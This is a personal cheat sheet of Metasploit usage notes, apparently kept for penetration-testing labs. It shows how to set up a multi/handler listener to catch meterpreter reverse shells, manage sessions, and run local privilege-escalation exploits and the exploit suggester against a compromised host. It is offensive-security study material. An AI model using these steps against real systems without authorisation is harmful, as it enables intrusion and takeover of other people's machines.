# Metasploit
This page is just basic stuff I forget all the time. There are other Metasploit tips in sections where it's relevant.

## Advanced options
Metasploit is so derp-easy that you can usually exploit a machine by typing `show options`, setting your machine with `LHOST` and setting the target with `RHOST`. However, sometimes it doesn't work because of an unusual configuration or path issue, which you can set with `show advanced`. You may need to set the correct target using `show targets` as in [MSO8-067](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi).

## Meterpreter
To catch shells using meterpreter:
```
use exploit/multi/handler
set LHOST [attack machine]
set LPORT 443
run
```
If you're VPNed into a lab, pay attention to the IP address. I've noticed that the first time this module runs, it defaults to `eth0` and you have to restart it to use something like `tap0`.

### Sessions
Meterpreter is nice because it lets you maintain multiple shell sessions and use local exploits against them. For example, the [Rejetto exploit](https://www.exploit-db.com/exploits/39161/) always seems to fire a few times and with meterpreter, you can catch every shell session with a single listener.

To list active sessions:
```
sessions -l
```
To enter a session:
```
sessions -i [session number]
```
To enter a shell from a session (not use meterpreter commands):
```
shell
```
To exit the shell and return to meterpreter, type `exit`.

### Local exploits
Once you have a meterpreter shell, you can scan for local exploits and run them. 

To access local exploits, you'll need to jump out of meterpreter using `background` and select one with the `use` command:
```
meterpreter > background
use /exploit/windows/whatever
show options
[edit options as needed]
set SESSION [session number]
run
```
You'll need to select a session where the exploit will be run.

The one useful exception I've noticed is the exploit suggester for Windows which can be run from the meterpreter prompt:

```
meterpreter > run /post/multi/recon/local_exploit_suggester
```
